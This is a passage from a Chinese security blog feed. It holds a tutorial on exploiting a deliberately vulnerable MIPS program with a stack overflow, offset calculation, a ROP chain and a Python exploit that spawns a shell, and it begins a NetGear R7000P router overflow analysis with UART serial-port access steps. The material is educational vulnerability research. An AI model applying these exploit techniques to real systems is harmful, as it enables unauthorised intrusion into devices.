class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">mips_stack.c<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">void</span> do_system(<span class="hljs-type">int</span> code,<span class="hljs-type">char</span> *cmd)<br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">255</span>];<br>    <span class="hljs-comment">//sleep(1);</span><br>    system(cmd);<br>&#125;<br><span class="hljs-type">void</span> main()<br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">256</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fileLen = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">struct</span> stat fileData;<br>    FILE *fp;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-number">0</span> == stat(<span class="hljs-string">&quot;/home/tigerortiger/study/mips_stack/passwd&quot;</span>,&amp;fileData))<br>        fileLen = fileData.st_size;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span>((fp = fopen(<span class="hljs-string">&quot;/home/tigerortiger/study/mips_stack/passwd&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;Cannot open file passwd!n&quot;</span>);<br>        exit(<span class="hljs-number">1</span>);<br>    &#125;    <br>    ch=fgetc(fp);<br>    printf(<span class="hljs-string">&quot;[+]  1 line : &quot;</span>);<br>    <span class="hljs-keyword">while</span>(count &lt;= fileLen)<br>    &#123;<br>        buf[count++] = ch;<br>        ch = fgetc(fp);<br>    <span class="hljs-comment">//printf(&quot;[+]   %s \r\n&quot;,ch);</span><br>    &#125;<br>    buf[--count] = <span class="hljs-string">&#x27;x00&#x27;</span>;<br>    printf(<span class="hljs-string">&quot;[+] passwd content : %s&quot;</span>,buf[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">if</span>(!strcmp(buf,<span class="hljs-string">&quot;adminpwd&quot;</span>))<br>    &#123;        <br>        do_system(count,<span class="hljs-string">&quot;ls -l&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        printf(<span class="hljs-string">&quot;you have an invalid password!n&quot;</span>);<br>    &#125;<br>    fclose(fp);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">./mips-linux-gcc -<span class="hljs-type">static</span> /home/tigerortiger/study/mips_stack/stack.c -o stack<br></code></pre></td></tr></table></figure><h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>1、首先查看文件信息，可以看到是mips32 架构</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image1.png" alt="image-20231217162032481"></p><p>2、根据查看mips_stack.c 的源码或者运行文件可以知道，main()函数会读取passwd 文件，并且将文件的内容种存入局部变量buf 中，而buf 仅为256字节，如果passwd 中的文件大于256字节，那么多余的字节就会导致缓冲区无法放下，造成溢出现象。<br>3、生成600个字符串都passwd<br><code>python -c &quot;print &#39;A&#39;*600&quot;&gt;passwd</code><br>4、执行文件，可以看到”segmentation fault “</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image2.png" alt="image-20231217162032481"></p><p>5、接下来进行远程调试，查看栈上的情况<br><code>tigerortiger@ubuntu ~/s/mips_stack&gt; qemu-mips-static -g 1234 ./stack</code></p><p>6、使用IDA 进行调试，连接，运行。</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image3.png" alt="image-20231217162032481"></p><p>7、程序在试图执行0x41414141处的指令时发生了崩溃,这刚好是AAAA的十六进制，0x41414141超出了进程,引发了断段故障</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image4.png" alt="image-20231217162032481"></p><p>由此上述分析可知，文件存在缓冲区溢出的漏洞，并且可以将数据覆盖到$RA寄存器中。</p><h2 id="漏洞exploit利用开发"><a href="#漏洞exploit利用开发" class="headerlink" title="漏洞exploit利用开发"></a>漏洞exploit利用开发</h2><p>完整漏洞利用开发过程应该是如下的步骤：<br>1、计算局部变量到 返回地址的偏移，也就是buf 到$ra的偏移，劫持PC；<br>2、寻找可利用的攻击方式和途径<br>3、构造ROP Chain<br>4、编写漏洞利用程序</p><h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>首先是确定buf 到$ra的偏移<br>这里介绍两种方法来进行计算<br><strong>1、栈帧分析</strong><br>通过静态分析，首先F5 看程序的伪代码，需要确定buf 离栈帧的地址，如下图所示，buf 会和adminpwd 进行比较，因此根据mips种函数调用参数的特性，可以定位到$a0，最终可以定位到 0x1C8+var_198，其中0x1C8 是栈帧的地址。</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image5.png" alt="image-20231217162032481"></p><p>下面确定buf 的偏移为-0x198 (这里的偏移都是相对栈帧fp), 并且也确定了$ra 的偏移为0x4。</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image6.png" alt="image-20231217162032481"></p><p>如果需要使缓冲区溢出，控制堆栈的返回地址$ra，需要覆盖的数据大小应该达到 0x4-(-0x198) &#x3D; 0x19c 字节</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image7.png" alt="image-20231217162032481"></p><p>确定了布局变量buf到返回的地址大小后，来验证是否正确<br> python -c “print ‘A’*0x19C + ‘BBBB’+’CCCC’” &gt; passwd<br> 如图所示，PC寄存器可以读入BBBB</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image8.png" alt="image-20231217162032481"></p><p><strong>2、使用脚本工具</strong><br>脚本自取：【<a href="https://github.com/desword/shellcode_tools/blob/master/patternLocOffset.py%E3%80%91">https://github.com/desword/shellcode_tools/blob/master/patternLocOffset.py】</a><br>使用脚本字符来将生成字符串存储到 passwd 中</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image9.png" alt="image-20231217162032481"></p><p>使用IDA 进行远程调试，可以看到在$ra地址处是 0x6E37416E</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image10.png" alt="image-20231217162032481"></p><p>使用脚本计算偏移为412，和上面栈帧分析的一样。</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image11.png" alt="image-20231217162032481"></p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/t01ee5255112c6ddeb3.png" alt="image-20231217162032481"></p><h3 id="寻找可利用的攻击途径"><a href="#寻找可利用的攻击途径" class="headerlink" title="寻找可利用的攻击途径"></a>寻找可利用的攻击途径</h3><p>通过对文件的静态分析，不难发现程序中调用了do_system_0 函数，这个函数会调用system()函数来执行第二个参数，因此只需要将要执行的命令传入do_system_0函数的第二个参数$a1 中即可。</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image12.png" alt="image-20231217162032481"></p><h3 id="构造ROP-chain"><a href="#构造ROP-chain" class="headerlink" title="构造ROP chain"></a>构造ROP chain</h3><p>这里需要用到IDA脚本插件mipsrop.py<br><strong>1、安装mipsrop.py</strong><br>下载，完了放到ida的plugins目录就行，重启IDA。<br>【<a href="https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py%E3%80%91">https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py】</a><br>2、打开你的mips程序，点击search——&gt;mips rop gadgets 。</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image13.png" alt="image-20231217162032481"></p><p>3、输入“ mipsrop.stackfinder() ”查找可用的godget</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image14.png" alt="image-20231217162032481"></p><p>4、双击0x00403810 可以看到这里，下面红色框中的代码我们可以用来构造rop chain。<br>为什么这段代码可以使用，是因为我们上面分析过，需要给do_system_0 函数 $a1 传递我们要执行的命令，恰好0x00403810此处将$sp+0x54+var_30内存中值赋值给$a1，只需要将要执行的命令放在$sp+0x54+var_30处，另外我们要调用do_system_0函数，下面0x00403814处 将$sp+0x54+var_s0的值加载到$ra 寄存中，后面会执行” jr $ra”, 让程序跳转到do_system_0继续执行。</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image15.png" alt="image-20231217162032481"></p><p>6、最终构造的ROP chain 如下图所示</p><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image-20231217163711370.png" alt="image-20231217163711370"></p><h3 id="编写漏洞利用程序"><a href="#编写漏洞利用程序" class="headerlink" title="编写漏洞利用程序"></a>编写漏洞利用程序</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go">Explainimport <span class="hljs-keyword">struct</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] prepare shellcode&quot;</span>)<br><br>cmd = <span class="hljs-string">&quot;sh&quot;</span><br>cmd += <span class="hljs-string">&quot;\00&quot;</span>*(<span class="hljs-number">4</span>-(<span class="hljs-built_in">len</span>(cmd) %<span class="hljs-number">4</span>))  # 栈对齐<br>shellcode = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x19C</span><br>shellcode += <span class="hljs-keyword">struct</span>.pack(<span class="hljs-string">&quot;&gt;L&quot;</span>,<span class="hljs-number">0x00403810</span>)<br>shellcode += <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">24</span><br>shellcode += cmd<br>shellcode += <span class="hljs-string">&quot;B&quot;</span>*(<span class="hljs-number">0x3C</span> - <span class="hljs-built_in">len</span>(cmd))<br>shellcode += <span class="hljs-keyword">struct</span>.pack(<span class="hljs-string">&quot;&gt;L&quot;</span>, <span class="hljs-number">0x00400680</span>)<br>shellcode += <span class="hljs-string">&quot;BBBB&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;OK!&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] create password file&quot;</span>)<br>fw = open(<span class="hljs-string">&#x27;passwd&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>fw.write(shellcode)<br>fw.<span class="hljs-built_in">close</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ok&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="执行exploit"><a href="#执行exploit" class="headerlink" title="执行exploit"></a>执行exploit</h2><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/Image17.png" alt="image-20231217162032481"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NetGear R7000P 路由器栈溢出漏洞硬件调试与分析</title>
    <link href="/2023/12/17/NetGear%20R7000P%20%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <url>/2023/12/17/NetGear%20R7000P%20%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>NetGear 系列中的路由器存在栈缓冲区溢出漏洞，漏洞的产生是由于在对处理输入的字符串时，将字符串存入栈中，没有对字符串的长度做限制。<br>调试漏洞设备： NetGear R7000P<br>调试漏洞固件版本：R7000P-V1.3.1.64_10.1.36<br>固件下载链接：【<a href="http://www.downloads.netgear.com/files/GDC/R7000P/R7000P-V1.3.1.64_10.1.36.zip%E3%80%91">http://www.downloads.netgear.com/files/GDC/R7000P/R7000P-V1.3.1.64_10.1.36.zip】</a><br>poc链接： 【<a href="https://github.com/grimm-co/NotQuite0DayFriday/tree/master/2020.06.15-netgear%E3%80%91">https://github.com/grimm-co/NotQuite0DayFriday/tree/master/2020.06.15-netgear】</a></p><h3 id="漏洞静态分析"><a href="#漏洞静态分析" class="headerlink" title="漏洞静态分析"></a>漏洞静态分析</h3><p>把下载好的固件包使用binwali -Me 解开。在后查看httpd 文件所在的位置<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image0-1-1621473365530.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image0-1"><br>首先根据公开的poc 开分析，漏洞产生的点有 “ upgrade_check.cgi “ 的字符串，可以定位到如下图的代码段。可以看到有两处，很明显是下面的判断才能使程序继续往下走，因为第一个判断里面讲初始化的stop_while 原本为1，设置为0，会导致程序去校验其他的文件，无法达到漏洞点。</p><p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image1-1621473388030.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image1"></p><p>最终会跳转到下面代码片段，最终跳出循环。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image2.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image2"></p><p>因为在循环之前，就设置stop_while的值为 1<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image3.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image3"></p><p>跳出循环后，往下继续看，发现会对数据进行判断，这里分别对“name&#x3D;”mtenFWUpload”” 和 “\r\n\r\n”进行判断，如果存在，则跳出当前循环</p><p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image4.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image4"></p><p>跳出循环后，就会执行到将产生溢出点的函数<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image5-1621473639593.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image5"></p><p>进入vulfunc函数，可以看到会对数据进行判断是否以”*#$^”开头。然后会将数据通过memcpy函数由src指向地址为起始地址的连续 v9 个字节的数据复制到以 s 指向地址为起始地址的空间内。并且可以看到 v9 的值是可以通过src 中的数据进行获取，因此可以进行通过控制 v9 的大小，将 src 的数据覆盖到 s 中，但 s 的大小只有140个字节，从而造成大缓冲区向小缓冲区复制的数据覆盖相邻内存内的数据。造成栈缓冲区溢出。</p><p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image6-1621473639595.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image6"></p><h3 id="接入路由器UART串口"><a href="#接入路由器UART串口" class="headerlink" title="接入路由器UART串口"></a>接入路由器UART串口</h3><p>首先需要识别串口<br>识别工具：万用表、 DSLogic 、 FT232转换USB<br>拆开路由器的外壳，可以很明显的看到路由器PCB 中有UART的四根引脚，如下图所示。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image7-1621474362325.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image7"></p><h4 id="识别UART-引脚"><a href="#识别UART-引脚" class="headerlink" title="识别UART 引脚"></a>识别UART 引脚</h4><p>接下来我们来识别UART的引脚。<br>这里使用万用表来识别URAT 四个引脚的定义，<br> URAT 主要的引脚分别是：</p><ul><li>TX （接收）</li><li>RX  （发送）</li><li>GND （接地）</li><li>Vcc （供电）</li></ul><p><strong>识别GND 引脚</strong><br>路由器PCB（通电）: 我是通电状态下测的<br>万用表：将万用表指针指向一个类似wifi 信号的符号。<br>万用表的黑色探针放在地面或者任意金属面，红色探针分别在4根引脚出逐一测试，直到听到滴滴或者哔哔的声音。下面这块PCB设备，第三根是GND引脚。<br>这种测试被称为通导性测试。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image8-1621474546801.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image8"></p><p><strong>识别Vcc 引脚</strong><br>PCB： 需要给PCB板子通电<br>万用表：指针指向20V的直流档位</p><p>1、黑色探针接地，红色探针在除了GND引脚的其他引脚测量，电压值为最大值，例如3.6V，5V等。就可以确定是VCC引脚。但是我在实际测试的时候，在第二根引脚和第四根引脚都是出现了最大电压值，不好判断。<br>第四根引脚电压值如下图所示<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image9.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image9"><br>第二根引脚电压值如下图所示<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image10.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image10"></p><p>2、不好判断的时候，将这两根引脚分别和GND引脚短接，设备重启，就可以判断是Vcc引脚。<br>这里我将GND引脚和第四根短接的时候，设备会重启。<br>因此第四根是Vcc引脚<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image12.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image12"></p><p><strong>识别TX 引脚和RX 引脚</strong><br>PCB ： 通电<br>万用表：指针指向20V的直流档位</p><p>1、 黑色探针放在GND 引脚，红色探针测试剩余的两根引脚。 测试GND 引脚和其他引脚之间的电压，由于设备在引导式会进行大量的数据传输，因此在电压有变化并且增大后固定一个值，那么这个引脚就是TX引脚。</p><p>2、 如果电压波动很小，或者一直为0，那该引脚就是Rx引脚。</p><h4 id="确定波特率"><a href="#确定波特率" class="headerlink" title="确定波特率"></a>确定波特率</h4><p>确定波特率有不同的方法，基本上常见的波特率都试一遍，一般都可以确定串口的波特率，但是这里介绍使用DSLogic 逻辑分析仪 来确定UART串口波特率。<br><strong>学习使用DSLogic</strong><br>首先要先学会使用逻辑分析仪，这里简单的测试让逻辑分析仪接收 “ helloworld “<br>接线： 将逻辑分析仪通道1的线接到FT232上的TXD（Tx）引脚。 然后将分析仪的黑色引线（接地线）接到GND引脚。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image13.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image13"><br>这里的DSView 工具中参数的设置需要去看说明文档，点击“开始”按钮，采集数据，然后使用XCOM串口工具设置好波特率和串口，打开串口后，设置发送的信息，点击发送即可。然后在DSView 就可以看到采集的信息了。采集完之后设置好解析，就可以看到对应的信息了<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image14.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image14"></p><p><strong>使用DSLogic 采集串口信息</strong><br>接线： 之前用万用表将引脚都识别出来了，因此直接把逻辑分析仪的通道1的线接到PCB串口的TX引脚上，然后将分析仪的黑色引线（接地线）接到GND引脚。如下图所示<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image15.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image15"></p><p>1、 线接好了之后，打开DSView 软件<br>* 设置采样率为1MHZ<br>* 设置采样时间为1s ，当然你也可以设置大一些，10s 或者更大，这样采集的信息可能会更多。<br>* 设置阈值电压，用万用表测是TX和GND之间的电压为3.34V，我这里设置为4V。<br>* 设置通道为6个，这个其实是用几个就设置几个。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image16.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image16"></p><p>点击开始按钮，进行采集，然后重启路由器PCB。<br>采集结果如下图所示<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image17.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image17"><br>注意这里显示了正常的ASCII码，是因为我设置好了波特率。一般来说，常用的波特率有常见波特率1200、2400、4800、19200、38400、57600、9600、115200。<br>如下图所示，如果不对，则为乱码，因此可以确定波特率为115200<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image18.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image18"></p><p><strong>PCB串口接入</strong><br>接线方式：<br>TTL    —– 路由器UART<br>GND  —– GND<br>TX   —– RX<br>RX  —– TX<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image19.jpg" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image19"><br>使用SecureCRT 接入连接<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image20.png" 